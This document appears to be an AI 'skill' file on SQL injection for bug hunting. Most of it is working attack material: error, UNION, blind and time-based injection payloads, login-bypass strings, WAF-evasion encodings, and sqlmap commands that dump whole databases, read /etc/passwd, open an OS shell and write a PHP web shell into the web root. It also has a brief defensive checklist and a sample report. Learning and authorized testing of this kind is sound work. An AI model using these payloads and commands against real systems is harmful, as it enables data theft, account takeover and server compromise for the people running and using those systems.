---
name: sqli-manual-and-automated
description: >
  Detect and exploit SQL injection vulnerabilities using both manual techniques and automated tools.
  Use this skill when testing web applications for database injection flaws including UNION-based,
  error-based, blind boolean, blind time-based, and out-of-band SQL injection. Covers WAF bypass,
  second-order SQLi, authentication bypass, and full database extraction with sqlmap.
domain: cybersecurity
subdomain: bug-hunting
category: Web Vulnerabilities
difficulty: intermediate
estimated_time: "3-5 hours"
mitre_attack:
  tactics: [TA0001, TA0009]
  techniques: [T1190]
cve_references: [CVE-2023-34362, CVE-2024-0352]
owasp_category: "A03:2021-Injection"
platforms: [linux, windows, macos]
tags: [sql-injection, sqli, database-exploitation, union-injection, blind-sqli, sqlmap, authentication-bypass, bug-bounty]
tools: [sqlmap, burpsuite, ghauri, commix]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# SQL Injection — Manual & Automated

## When to Use
- When testing web applications that interact with SQL databases
- When user input is reflected in database queries (search, login, filters, sorting)
- When you see database error messages in application responses
- When testing API endpoints that accept structured query parameters
- When login forms don't use parameterized queries

## Prerequisites
- Burp Suite Pro/Community for request interception
- `sqlmap` for automated injection and extraction
- Understanding of SQL syntax (MySQL, PostgreSQL, MSSQL, Oracle)
- Target must use a SQL database backend

## Workflow

### Phase 1: Detection & Fingerprinting

```bash
# Step 1: Inject special chars to trigger errors
# Single quote (most common)
https://target.com/product?id=1'

# Double quote
https://target.com/product?id=1"

# Semicolon (query stacking)
https://target.com/product?id=1;

# Comment markers
https://target.com/product?id=1--
https://target.com/product?id=1#

# Step 2: Boolean-based detection
# True condition (should return normal page):
https://target.com/product?id=1 AND 1=1
# False condition (should return different/empty page):
https://target.com/product?id=1 AND 1=2

# If responses differ → SQL injection confirmed

# Step 3: Time-based detection (for blind SQLi)
# MySQL:
https://target.com/product?id=1 AND SLEEP(5)--
# MSSQL:
https://target.com/product?id=1; WAITFOR DELAY '0:0:5'--
# PostgreSQL:
https://target.com/product?id=1; SELECT pg_sleep(5)--

# Step 4: Database fingerprinting
# MySQL:  SELECT @@version
# MSSQL:  SELECT @@version
# Oracle: SELECT banner FROM v$version
# PostgreSQL: SELECT version()
```

### Phase 2: UNION-based Extraction

```sql
-- Step 1: Find number of columns
ORDER BY 1--    -- OK
ORDER BY 2--    -- OK
ORDER BY 3--    -- ERROR → 2 columns

-- Step 2: Find displayable columns
UNION SELECT NULL,NULL--
UNION SELECT 'a',NULL--
UNION SELECT NULL,'a'--

-- Step 3: Extract database info
-- MySQL:
UNION SELECT @@version, database()--
UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
UNION SELECT username,password FROM users--

-- PostgreSQL:
UNION SELECT version(), current_database()--
UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--

-- MSSQL:
UNION SELECT @@version, DB_NAME()--
UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--

-- Oracle:
UNION SELECT banner,NULL FROM v$version--
UNION SELECT table_name,NULL FROM all_tables--
```

### Phase 3: Blind Extraction

```sql
-- Boolean-based blind (extract data char by char)
-- Extract database name character 1:
AND (SELECT SUBSTRING(database(),1,1))='a'--
AND (SELECT SUBSTRING(database(),1,1))='b'--
-- ... continue until response changes

-- Binary search (faster):
AND (SELECT ASCII(SUBSTRING(database(),1,1))) > 64--   -- m or higher?
AND (SELECT ASCII(SUBSTRING(database(),1,1))) > 96--   -- a-z range?
AND (SELECT ASCII(SUBSTRING(database(),1,1))) > 112--  -- p or higher?
-- Narrow down to exact character

-- Time-based blind:
AND IF((SELECT SUBSTRING(database(),1,1))='a', SLEEP(3), 0)--
AND IF((SELECT SUBSTRING(database(),1,1))='s', SLEEP(3), 0)--
```

### Phase 4: Authentication Bypass

```sql
-- Classic login bypass
-- Username field:
admin'--
admin'/*
' OR '1'='1
' OR '1'='1'--
') OR ('1'='1
admin' OR '1'='1'#

-- Password field:
' OR '1'='1'--
anything' OR '1'='1'--

-- Combined (username: admin'--, password: anything)
-- Query becomes: SELECT * FROM users WHERE username='admin'--' AND password='anything'
-- Password check is commented out

-- Advanced bypass:
' UNION SELECT 1,'admin','password_hash' FROM dual--
```

### Phase 5: Automated Exploitation with sqlmap

```bash
# Basic scan
sqlmap -u "https://target.com/product?id=1" --batch --dbs

# With authentication
sqlmap -u "https://target.com/product?id=1" \
  --cookie="session=abc123" \
  --batch --dbs

# From Burp request file (most reliable)
sqlmap -r request.txt --batch --dbs

# Full database dump
sqlmap -r request.txt --batch -D target_db --tables
sqlmap -r request.txt --batch -D target_db -T users --dump

# WAF bypass
sqlmap -r request.txt --batch --tamper=space2comment,between,randomcase \
  --random-agent --delay=2

# OS shell (if stacked queries + file privileges)
sqlmap -r request.txt --batch --os-shell

# File read/write
sqlmap -r request.txt --batch --file-read="/etc/passwd"
sqlmap -r request.txt --batch --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# POST parameter
sqlmap -u "https://target.com/login" \
  --data="username=admin&password=test" \
  -p username --batch --dbs

# Increase risk and level for thorough testing
sqlmap -r request.txt --batch --level=5 --risk=3 --dbs
```

### Phase 6: WAF Bypass Techniques

```sql
-- Space alternatives
/**/SELECT/**/username/**/FROM/**/users
SELECT%09username%09FROM%09users   -- Tab
SELECT%0Ausername%0AFROM%0Ausers   -- Newline

-- Case manipulation
SeLeCt UsErNaMe FrOm UsErS

-- Double encoding
%2527 → %27 → '

-- Null bytes
%00' OR 1=1--

-- Comment injection
UN/**/ION SE/**/LECT

-- HPP (HTTP Parameter Pollution)
?id=1&id=UNION&id=SELECT

-- Chunk transfer encoding (in POST body)

-- Using sqlmap tampers:
sqlmap -r r.txt --tamper=apostrophemask,between,charencode,equaltolike,greatest,halfversionedmorekeywords,modsecurityversioned,percentage,randomcase,space2comment,space2dash,space2mssqlblank,space2mysqldash,unionalltounion,unmagicquotes
```


## 🔵 Blue Team Detection
- **Parameterized queries**: Use prepared statements — NEVER concatenate user input into SQL
- **WAF rules**: Detect common SQLi patterns (UNION SELECT, OR 1=1, SLEEP(), etc.)
- **Input validation**: Whitelist expected characters (numeric IDs should only accept digits)
- **Database monitoring**: Alert on unusual queries, mass data extraction, or schema enumeration
- **Least privilege**: Database user should have minimum required permissions
- **Error handling**: Never expose raw database errors to users

## Key Concepts
| Concept | Description |
|---------|-------------|
| UNION injection | Combining attacker's SELECT with original query to extract data |
| Error-based | Forcing database errors that reveal data in error messages |
| Boolean blind | Inferring data through true/false application behavior differences |
| Time-based blind | Inferring data through delayed response times |
| Out-of-band | Exfiltrating data via DNS or HTTP to attacker-controlled server |
| Stacked queries | Executing multiple SQL statements separated by semicolons |
| Second-order SQLi | Payload stored first, then executed when used in a different query |

## Output Format
```
SQL Injection Report
====================
Title: UNION-based SQL Injection in Product Search
Severity: CRITICAL (CVSS 9.8)
Endpoint: GET /api/products?category=
Parameter: category
DBMS: MySQL 8.0.32

Extracted Data:
- Database: production_db
- Tables: users, orders, payments, sessions
- Users table: 45,000 records (username, email, password_hash, role)
- Payment table: Credit card data (PCI violation)

Impact:
- Full database compromise
- PII/PCI data exposure for 45,000 users
- Potential for OS command execution via INTO OUTFILE
- Authentication bypass confirmed

Remediation:
1. Use parameterized queries / prepared statements
2. Implement input validation (whitelist allowed characters)
3. Apply principle of least privilege to database users
4. Deploy WAF rules for SQL injection detection
5. Remove verbose error messages from production
```


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- OWASP: [SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- PortSwigger: [SQL Injection Labs](https://portswigger.net/web-security/sql-injection)
- sqlmap: [Official Documentation](https://sqlmap.org/)
- PayloadsAllTheThings: [SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
